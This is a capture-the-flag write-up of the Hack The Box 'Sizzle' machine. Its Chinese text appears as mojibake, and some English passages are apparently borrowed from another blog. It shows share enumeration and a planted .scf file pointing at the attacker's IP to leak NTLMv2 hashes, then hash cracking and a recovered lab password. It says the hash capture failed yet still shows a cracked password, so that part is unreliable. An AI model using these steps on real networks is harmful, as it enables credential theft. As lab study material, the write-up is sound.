SizzleÔºö10.10.10.103

kaliÔºö10.10.16.5

[HTB: Sizzle | 0xdf hacks stuff](https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html#box-info)

[HackTheBox-Sizzle. Hello everyone , in this post I will be‚Ä¶ | by ARZ101 | Medium](https://arz101.medium.com/hackthebox-sizzle-bae3ccdee7e1)

# Recon

## nmap

```bash
‚îî‚îÄ# nmap -sT -p- --min-rate 5555  10.10.10.103
```

```bash
‚îî‚îÄ# nmap -sC -sV -O -p21,53,80,135,139,443,445,464,593,636,3268,3269,5985,5986,9389,47001 -oN namp.txt 10.10.10.103 

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2023-09-20T03:03:49+00:00; -2s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2023-09-20T03:03:49+00:00; -2s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2023-09-20T03:03:50+00:00; -1s from scanner time.
3269/tcp  open  ssl/ldap
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2023-09-20T03:03:49+00:00; -2s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2023-09-20T03:03:49+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2018-07-02T20:26:23
|_Not valid after:  2019-07-02T20:26:23
| tls-alpn: 
|   h2
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016 (85%)
OS CPE: cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows
```



## 21 FTP

Âï•‰πüÊ≤°Êúâ

```bash
‚îî‚îÄ# ftp 10.10.10.103
Connected to 10.10.10.103.
220 Microsoft FTP Service
Name (10.10.10.103:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||58315|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> pwd
Remote directory: /
```



## 80 website

<img src=".\ÂõæÁâá\Snipaste_2023-09-20_11-03-20.png" alt="Snipaste_2023-09-20_11-03-20" style="zoom:80%;" />

ÂèØÂ∞ùËØïÁõÆÂΩïÊâ´Êèè

```bash
gobuster -u http://10.10.10.103/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x asp,aspx,txt,html 
```

Áî±‰∫éÊòØ iis ÊúçÂä°Âô®ÔºåÂèØ‰ª•Êç¢‰∏™Â≠óÂÖ∏ËØïËØï

```bash
gobuster -k -u https://10.10.10.103 -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -t 50

//certenroll/ (Status: 403)
```

‰πüÊ≤°‰ªÄ‰πàÂèëÁé∞



## 389 LDAP

Ê≤°ÂìüÂá≠ÊçÆÁöÑÊó∂ÂÄôÂï•‰πüÊâæ‰∏çÂà∞ÔºåÁ≠âÂà∞ÊúâÂá≠ÊçÆ‰∫ÜÂÜçËØ¥



## 445 SMB

```bash
‚îî‚îÄ# smbmap -u xxx  -H 10.10.10.103 
[+] Guest session   	IP: 10.10.10.103:445	Name: 10.10.10.103                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	NO ACCESS	Active Directory Certificate Services share
	Department Shares                                 	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Operations                                        	NO ACCESS	
	SYSVOL                                            	NO ACCESS	Logon server share     
```

```bash
‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Sizzle]
‚îî‚îÄ# smbclient -N -L \\\\10.10.10.103

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	CertEnroll      Disk      Active Directory Certificate Services share
	Department Shares Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Operations      Disk      
	SYSVOL          Disk      Logon server share 
```

Áî±‰∫é smbmap ËøôÈáåÊó†Ê≥ïÊâæÂà∞ÊØè‰∏™ÁõÆÂΩïÁöÑÊùÉÈôê

Êé•‰∏ãÊù•Â∞±ÊòØÈ™öÊìç‰Ωú‰∫ÜÔºå‰∏∫‰∫ÜÊòéÁ°ÆÊØè‰∏™ÁõÆÂΩïÁöÑÊùÉÈôêÔºåÁî®Âæ™ÁéØÂä†ËøáÊª§Êï¥ÁêÜÔºö

```bash
‚îî‚îÄ# smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/'
ADMIN$          
C$              
CertEnroll      
Department Shares 
NETLOGON        
Operations      
SYSVOL     
```

```bash
‚îî‚îÄ# smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' | while read share; do echo "======${share}======"; smbclient -N "//10.10.10.103/${share}" -c dir; echo; done
```

```bash
======ADMIN$======
tree connect failed: NT_STATUS_ACCESS_DENIED

======C$======
tree connect failed: NT_STATUS_ACCESS_DENIED

======CertEnroll======
NT_STATUS_ACCESS_DENIED listing \*

======Department Shares======
  .                                   D        0  Tue Jul  3 11:22:32 2018
  ..                                  D        0  Tue Jul  3 11:22:32 2018
  Accounting                          D        0  Mon Jul  2 15:21:43 2018
  Audit                               D        0  Mon Jul  2 15:14:28 2018
  Banking                             D        0  Tue Jul  3 11:22:39 2018
  CEO_protected                       D        0  Mon Jul  2 15:15:01 2018
  Devops                              D        0  Mon Jul  2 15:19:33 2018
  Finance                             D        0  Mon Jul  2 15:11:57 2018
  HR                                  D        0  Mon Jul  2 15:16:11 2018
  Infosec                             D        0  Mon Jul  2 15:14:24 2018
  Infrastructure                      D        0  Mon Jul  2 15:13:59 2018
  IT                                  D        0  Mon Jul  2 15:12:04 2018
  Legal                               D        0  Mon Jul  2 15:12:09 2018
  M&A                                 D        0  Mon Jul  2 15:15:25 2018
  Marketing                           D        0  Mon Jul  2 15:14:43 2018
  R&D                                 D        0  Mon Jul  2 15:11:47 2018
  Sales                               D        0  Mon Jul  2 15:14:37 2018
  Security                            D        0  Mon Jul  2 15:21:47 2018
  Tax                                 D        0  Mon Jul  2 15:16:54 2018
  Users                               D        0  Tue Jul 10 17:39:32 2018
  ZZ_ARCHIVE                          D        0  Mon Jul  2 15:32:58 2018

		7779839 blocks of size 4096. 3228990 blocks available

======NETLOGON======
NT_STATUS_ACCESS_DENIED listing \*

======Operations======
NT_STATUS_ACCESS_DENIED listing \*

======SYSVOL======
NT_STATUS_ACCESS_DENIED listing \*
```

ÂæóÂà∞  `Department Shares `  ÁõÆÂΩïÊàë‰ª¨ÂèØ‰ª•ËøõÂÖ•ÔºåËøôÈáå‰∏∫‰∫ÜÊñπ‰æøÊìç‰ΩúÔºåÁõ¥Êé•ÊääÂÖ±‰∫´ÁõÆÂΩïÊåÇËΩΩÂà∞Êú¨Âú∞

```bash
‚îî‚îÄ# mount -t cifs "//10.10.10.103/Department Shares" /mnt
Password for root@//10.10.10.103/Department Shares: 
‚îî‚îÄ# cd /mnt/   
‚îî‚îÄ# ls               
 Accounting   Banking         Devops    HR        Infrastructure   Legal   Marketing   Sales      Tax     ZZ_ARCHIVE
 Audit        CEO_protected   Finance   Infosec   IT              'M&A'   'R&D'        Security   Users
```

Êü•Áúã users ÁõÆÂΩï

```bash
‚îå‚îÄ‚îÄ(rootüíÄkali)-[/mnt/users]
‚îî‚îÄ# ls
amanda  amanda_adm  bill  bob  chris  henry  joe  jose  lkys37en  morgan  mrb3n  Public
```

ÁúãÂà∞‰∏Ä‰∫õÁî®Êà∑ÂêçÔºåË¶ÅÁïôÂøÉÊääÂÆÉ‰ª¨Êï¥ÁêÜÊàêÂ≠óÂÖ∏

Êé•‰∏ãÊù•ÂèØ‰ª•Ê£ÄÊü•‰∏ã /mnt/ ÁõÆÂΩï‰∏ãÊàñÊñá‰ª∂ÁöÑÂÜôÊùÉÈôêÔºå‰æùÊóßÊòØ bashËÑöÊú¨ÁºñÁ®ãÂÆåÊàêÔºö

```bash
‚îî‚îÄ# find . -type d | while read directory; do touch ${directory}/0xdf 2>/dev/null && echo "${directory} - write file" && rm ${directory}/0xdf; mkdir ${directory}/0xdf 2>/dev/null && echo "${directory} - write directory" && rmdir ${directory}/0xdf; done

./Users/Public - write file
./Users/Public - write directory
./ZZ_ARCHIVE - write file
./ZZ_ARCHIVE - write directory
```

Êé•‰∏ãÊù•Êàë‰ª¨ÂèØ‰ª•Âú®ÂèØÂÜôÁõÆÂΩïÂàõÂª∫ÁÇπÊñ∞Êñá‰ª∂Ôºå‰ΩÜÊòØËøá‰∏ÄÊÆµÊó∂Èó¥ÔºåËøô‰∫õÊñ∞Êñá‰ª∂Â∞±Ë¢´Ëá™Âä®Âà†Èô§‰∫Ü

```bash
‚îî‚îÄ# touch {/mnt/ZZ_ARCHIVE/,./}0xdf.{lnk,exe,dll,ini}                                                                                                                                                                                                                       
‚îå‚îÄ‚îÄ(rootüíÄkali)-[/mnt/users/public]
‚îî‚îÄ# ls
0xdf.dll  0xdf.exe  0xdf.exetouch  0xdf.ini  0xdf.lnk  0xdf.lnktouch
```

ÁõëÊéßÊñ∞ÂàõÂª∫ÁöÑÊñá‰ª∂

```bash
watch -d "ls /mnt/Users/Public/*; ls /mnt/ZZ_ARCHIVE/0xdf*"
```

<img src=".\ÂõæÁâá\Snipaste_2023-09-20_11-42-02.png" alt="Snipaste_2023-09-20_11-42-02" style="zoom:67%;" />

`/mnt/users/public` Èáå‰∏ãÊñ∞ÂàõÂª∫ÁöÑÊñá‰ª∂Ëøá‰∏Ä‰ºöÂÑøË¢´Ëá™Âä®Âà†Èô§‰∫Ü

ÂèñÊ∂àÊåÇËΩΩÂëΩ‰ª§

```bash
‚îî‚îÄ# umount /mnt/
```



# Creds for Amanda

## Strategy

Now that I know there‚Äôs some kind of user interaction on this host, a bunch more ideas for attack vectors come to mind. [This paper](http://www.defensecode.com/whitepapers/Stealing-Windows-Credentials-Using-Google-Chrome.pdf) outlines how Windows Explorer Shell Command files (`.scf`) can be used to get Windows to open an SMB connection whenever a user visits a directory containing the file. A `.scf` is a text file that can include an icon path that can be remote. `.lnk` files used to have the same issue, but this was [patched in August 2010](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2010/ms10-046) after Stuxnet was seen in the wild abusing `.lnk` files

For Sizzle, I will drop a `.scf` file with a link location on my host, and use responder to capture the NTLMv2 hash. For more information on responder and NetNTLMv2, check out [my post on responder](https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html), which was released just around the time Sizzle was released (though I hadn‚Äôt done Sizzle yet). Here‚Äôs [another reference](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) for methods to capture NetNTLMv2, which includes `.scf` files.

Â§ßÊ¶ÇÊÑèÊÄùÂ∞±ÊòØÔºåÂΩìÊúâÁî®Êà∑Êü•Áúã `.scf` Êñá‰ª∂ÊâÄÂú®ÁöÑÁõÆÂΩïÊàñËÄÖÂÅö‰∫Ü‰ªÄ‰πà‰∫ãÊÉÖÊó∂Ôºå`.csf` Êñá‰ª∂ÈáåÁöÑ `icon` Ë∑ØÂæÑ‰ºöË¢´ËøúÁ®ãÊâßË°å„ÄÇ‰ª•‰∏äÂÆöÊó∂Âà†Èô§Êñá‰ª∂ÁöÑËøô‰∏™ÁâπÊÄßÂàöÂ•ΩÊª°Ë∂≥‰∫ÜÊàë‰ª¨ÊîªÂáªÁöÑÊù°‰ª∂ÔºåÂèØÈÖçÂêà `Responder`

## Get NetNTLMv2

```bash
root@kali:/mnt/Users/Public# cat 0xdf.scf 
[Shell]
Command=2
IconFile=\\10.10.16.5\uwu\uwu.ico
[Taskbar]
Command=ToggleDesktop
```

ÈÖçÂêà Responder 

```
‚îî‚îÄ# responder -I tun0 --lm
```

Â§±Ë¥•‰∫ÜÔºåÊ†πÊú¨Êé•Âèó‰∏çÂà∞Ôºå‰∏çÁü•ÈÅìÂéüÂõ†



## Crack NetNTLMv2

```bash
‚îî‚îÄ# john --wordlist=/usr/share/wordlists/rockyou.txt amanda-ntlmv2 
```

```bash
hashcat -m 5600 amanda-ntlmv2 /usr/share/wordlists/rockyou.txt --force
```

ÂæóÂà∞Âá≠ÊçÆÔºö

```
Ashare1972       (amanda)     
```



# Enumeration as amanda

## Shell over WinRM - Fail

Â§±Ë¥•ÔºåÊó†Ê≥ï winrm ËøúÁ®ãÁôªÂΩï



## Share Access

```bash
‚îî‚îÄ# smbmap -H 10.10.10.103 -u amanda -p Ashare1972
[+] IP: 10.10.10.103:445	Name: 10.10.10.103                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	Department Shares                                 	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Operations                                        	NO ACCESS	
	SYSVOL                                            	READ ONLY	Logon server share 
```



## LDAP

```bash
‚îî‚îÄ# ldapdomaindump -u 'htb.local\amanda' -p Ashare1972 10.10.10.103 -o ldap/                                 
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

```bash
‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Sizzle/ldap]
‚îî‚îÄ# ls
domain_computers_by_os.html  domain_computers.json  domain_groups.json  domain_policy.json  domain_trusts.json          domain_users.html
domain_computers.grep        domain_groups.grep     domain_policy.grep  domain_trusts.grep  domain_users_by_group.html  domain_users.json
domain_computers.html        domain_groups.html     domain_policy.html  domain_trusts.html  domain_users.grep
```

<img src=".\ÂõæÁâá\Snipaste_2023-09-20_13-14-35.png" alt="Snipaste_2023-09-20_13-14-35" style="zoom:80%;" />



# Shell as amanda

## Accessing /certsrv

Êúâ‰∏™ web ÁõÆÂΩï `/certsrv` ‰πãÂâç gobuster Ê≤°ÊâæÂà∞ÂÆÉÔºåÂõ†‰∏∫ËßÑÂàôÊ≤°Âä† 401Ôºå‰ª•‰∏ãÂàôÂèØ‰ª•ÊâæÂà∞Ëøô‰∏™ÁõÆÂΩï

```bash
gobuster -k -u https://10.10.10.103 -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -t 20 -s 200,204,301,302,307,403,401
```

‰∏Ä‰∏™ÁôªÂΩïÊ°Ü

<img src=".\ÂõæÁâá\Snipaste_2023-09-20_13-18-05.png" alt="Snipaste_2023-09-20_13-18-05" style="zoom:80%;" />

Áî®‰πãÂâçÂæóÂà∞ÁöÑÂá≠ÊçÆ `amanda:Ashare1972` ÁôªÂΩïËØïËØï

<img src=".\ÂõæÁâá\Snipaste_2023-09-20_13-20-55.png" alt="Snipaste_2023-09-20_13-20-55" style="zoom:80%;" />

ÁôªÂΩïÂêéÊòØ‰∏Ä‰∏™Á±ª‰ººËØÅ‰π¶‰ªÄ‰πàÁöÑ

## Generate Certificate and Key for amanda
